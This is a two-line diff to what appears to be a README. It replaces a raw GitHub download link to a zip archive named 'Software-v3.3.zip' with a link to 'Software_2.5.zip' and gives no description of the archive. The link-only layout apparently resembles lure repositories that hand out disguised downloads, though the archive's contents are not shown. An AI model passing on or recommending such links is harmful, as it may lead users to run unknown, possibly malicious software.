@@ -1,2 +1,2 @@
-# https://raw.githubusercontent.com/Subhopriyo/Raindrops/master/scapulovertebral/Software-v3.3.zip
-Boiler plate for https://raw.githubusercontent.com/Subhopriyo/Raindrops/master/scapulovertebral/Software-v3.3.zip
+# https://github.com/Subhopriyo/Raindrops/raw/refs/heads/master/scapulovertebral/Software_2.5.zip
+Boiler plate for https://github.com/Subhopriyo/Raindrops/raw/refs/heads/master/scapulovertebral/Software_2.5.zip
